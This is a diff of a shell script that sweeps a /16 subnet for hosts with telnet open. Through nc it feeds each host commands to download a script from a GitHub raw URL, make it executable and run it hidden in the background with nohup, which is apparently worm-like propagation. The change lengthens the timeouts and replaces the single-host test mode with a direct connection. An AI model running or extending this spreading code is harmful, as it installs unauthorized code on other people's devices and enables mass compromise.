@@ -14,11 +14,12 @@ talk() {
   echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
   echo -n 'chmod +x $J ;'
   echo 'nohup $J > /dev/null 2>&1'
+  sleep 20
 }
 
 connectTo() {
   echo connecting to $1:23 >&2
-  talk | timeout -t 20 nc $1 23
+  talk | timeout -t 60 nc $1 23
 }
 
 sweep() {
@@ -42,6 +43,5 @@ if [ -z "$1" ] ; then
   echo scanning subnet $MYSUBNET.0.0/16 >&2
   while true ; do sweep ; done
 else
-  echo testing with $1...
-  sweep $1
+  connectTo $1
 fi
